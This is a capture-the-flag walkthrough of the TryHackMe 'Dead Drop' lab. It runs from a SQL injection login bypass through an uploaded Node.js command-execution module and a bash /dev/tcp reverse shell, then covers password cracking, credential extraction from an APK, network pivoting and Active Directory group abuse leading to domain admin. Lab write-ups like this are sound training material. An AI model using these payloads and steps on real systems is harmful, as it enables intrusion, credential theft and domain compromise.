# Dead Drop

Room: https://tryhackme.com/room/dead-drop

Every dead drop points inward. Chain your findings, pivot through the gaps, and follow the trail until nothing is out of reach.

You have been engaged as a penetration tester for a security audit of DeadDrop Ltd, a document management company that provides file-sharing services to corporate clients. The company recently expanded its infrastructure and wants assurance that its systems are secure before onboarding a major new client.

Your point of entry is a web-facing file-sharing application. Behind it sits an internal corporate network that you have no direct access to. Your objective is clear: compromise the domain controller and retrieve the flag from the Administrator's desktop. How you get there is up to you.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/dead-drop.md

## What password grants you SSH access to the web server?

The first foothold came from the login page:

```text
http://192.168.11.200/login
```

The login form was vulnerable to SQL injection. I logged in by entering the following as the username:

```text
' or 1=1 --
```

This bypassed authentication and gave access to the DeadDrop dashboard.

The dashboard had an upload feature, along with rename, delete, and preview actions. PHP files were not executed by the web server. They downloaded instead. The useful discovery was that `.js` files could be previewed at paths like:

```text
http://192.168.11.200/preview/cmd.js
```

When I renamed a PHP payload to `.js`, the preview failed with a JavaScript parsing error. That suggested the application was trying to load uploaded `.js` files as server-side Node.js modules.

To confirm server-side JavaScript execution, I uploaded a valid Node.js module:

```js
const { execSync } = require("child_process");

module.exports = execSync("id").toString();
```

Previewing the file returned command output as the `node` user:

```text
uid=996(node) gid=996(node) groups=996(node)
```

From there, I used a non-blocking reverse shell payload. Using `exec` avoided locking up the web application, which happened when using `execSync` for long-running commands.

```js
const { exec } = require("child_process");

exec("timeout 5 bash -c 'bash -i >& /dev/tcp/192.168.21.7/4444 0>&1'");

module.exports = "reverse shell attempted";
```

Listener on the AttackBox:

```bash
nc -lvnp 4444
```

The shell connected back successfully:

```text
Connection received on 192.168.11.200
node@tryhackme-2404:/opt/app$
```

During enumeration, I found a backup file in the web application directory:

```bash
cd /opt/app/backup
ls
```

```text
shadow.bak
```

The backup contained a shadow-style hash and a passwd-style entry for the `svc-drop` user:

```text
svc-drop:$6$[REDACTED_HASH]:19700:0:99999:7:::
svc-drop:x:1001:1001::/home/svc-drop:/bin/bash
```

The hash was SHA512 crypt. Since I knew the password length was 14 characters, I filtered `rockyou.txt` before cracking it:

```bash
awk 'length == 14' /usr/share/wordlists/rockyou.txt > rockyou_14.txt
john shadow_hash.txt --wordlist=rockyou_14.txt
```

John cracked the password for `svc-drop`.

```text
Answer: [REDACTED]
```

The cracked password allowed SSH access to the web server:

```bash
ssh svc-drop@192.168.11.200
```

## What credentials does the company's internal mobile application contain? Format: username:password

After logging in as `svc-drop`, I found an APK in the user's backup directory:

```bash
cd ~/backup
ls
```

```text
deaddrop-mobile.apk
```

I copied the APK back to the AttackBox and started with `strings` to quickly search for readable values:

```bash
strings deaddrop-mobile.apk | grep -iE 'username|password|user|pass|admin|svc|drop|deaddrop|jupiter'
```

This revealed the password string:

```text
DropsOfJupiter2026!
```

To identify which file contained that string inside the APK, I used `zipgrep`:

```bash
zipgrep -n "DropsOfJupiter2026!" deaddrop-mobile.apk
```

It showed matches in binary APK components:

```text
classes3.dex:Binary file (standard input) matches
resources.arsc:Binary file (standard input) matches
```

Because `resources.arsc` matched, I decoded the APK with `apktool`:

```bash
apktool d deaddrop-mobile.apk -o deaddrop-apktool
```

Then searched the decoded output with surrounding context:

```bash
grep -Rni -A8 -B8 "DropsOfJupiter2026" deaddrop-apktool
```

The credential values were stored in the app's string resources:

```xml
<string name="default_password">DropsOfJupiter2026!</string>
<string name="default_username">[REDACTED]</string>
```

The internal mobile application contained domain credentials.

```text
Answer: [REDACTED]:DropsOfJupiter2026!
```

## What Active Directory permission does your domain account hold that can be abused for privilege escalation?

The recovered mobile credentials worked against the Domain Controller:

```bash
nxc smb 192.168.11.100 -u [REDACTED] -p 'DropsOfJupiter2026!'
```

The domain was identified as:

```text
deaddrop.loc
```

I pivoted through the web server with `sshuttle` because the AttackBox could not directly reach the Domain Controller:

```bash
python3 -m sshuttle --dns=0 -r svc-drop@192.168.11.200 192.168.11.0/24
```

A TCP scan confirmed the Domain Controller services were reachable through the pivot:

```bash
nmap -Pn -sT -p 53,88,135,139,389,445,464,593,636,3268,3269,3389 192.168.11.100
```

Open ports included Kerberos, LDAP, SMB, LDAPS, Global Catalog, and RDP.

I used `bloodyAD` to enumerate writable AD objects:

```bash
bloodyAD --host 192.168.11.100 -d deaddrop.loc -u [REDACTED] -p 'DropsOfJupiter2026!' get writable
```

The relevant abusable permission was the ability to add members to a privileged group.

```text
Answer: Add********
```

## What is the name of the group you target to escalate to Domain Admin?

To identify the escalation target, I reviewed the writable AD objects from `bloodyAD` and looked for custom groups rather than default built-in groups:

```bash
bloodyAD --host 192.168.11.100 -d deaddrop.loc -u [REDACTED] -p 'DropsOfJupiter2026!' get writable | grep -iE 'group|admin|support|CN='
```

The output included a custom admin-style group under `CN=Users,DC=deaddrop,DC=loc`.

After identifying the `AddMember` permission, I added the domain account to the custom admin group:

```bash
bloodyAD --host 192.168.11.100 -d deaddrop.loc -u [REDACTED] -p 'DropsOfJupiter2026!' add groupMember '[REDACTED_GROUP]' '[REDACTED_USER]'
```

```text
Answer: [REDACTED]
```

## What is the flag on the Domain Controller?

After the AD escalation path was identified, I confirmed command execution on the Domain Controller with NetExec:

```bash
nxc smb 192.168.11.100 -d deaddrop.loc -u [REDACTED] -p 'DropsOfJupiter2026!' -x 'whoami'
```

The command executed successfully as the domain account.

I listed the Administrator desktop:

```bash
nxc smb 192.168.11.100 -d deaddrop.loc -u [REDACTED] -p 'DropsOfJupiter2026!' -x 'dir C:\Users\Administrator\Desktop'
```

The flag file was present:

```text
C:\Users\Administrator\Desktop\flag.txt
```

I read the flag with:

```bash
nxc smb 192.168.11.100 -d deaddrop.loc -u [REDACTED] -p 'DropsOfJupiter2026!' -x 'type C:\Users\Administrator\Desktop\flag.txt'
```

```text
Answer: THM{REDACTED}
```

## Full Attack Chain

```text
SQL injection login with ' or 1=1 --
Upload valid Node.js module
Preview route executes JavaScript server-side
Reverse shell as node
Find shadow.bak
Crack svc-drop password
SSH as svc-drop
Extract deaddrop-mobile.apk
Use strings and zipgrep to locate hardcoded mobile password
Decode APK with apktool to find the paired username
Pivot through web server with sshuttle
Authenticate to deaddrop.loc using the mobile credentials
Identify AddMember privilege
Target the custom admin group
Execute commands on the Domain Controller
Read Administrator Desktop flag
```

## Notes

The important mistake to avoid is treating the upload as a PHP webshell opportunity. PHP files downloaded instead of executing. The real issue was that the preview feature loaded uploaded `.js` files server-side as Node.js modules.

For reverse shells, `execSync` can lock the web application because it waits for the process to exit. Using non-blocking `exec` with `timeout` avoided hanging the preview route.

The failed callback was caused by using the wrong local VPN IP. The correct listener address was the `tun0` address reachable from the target network.

The APK password was easy to spot with `strings`, but `apktool` was useful for finding the matching username cleanly in `res/values/strings.xml`.

For the AD questions, answer formatting mattered. The expected permission was `AddMember`, while the group name was discovered from the writable AD object list rather than guessed from default AD groups.
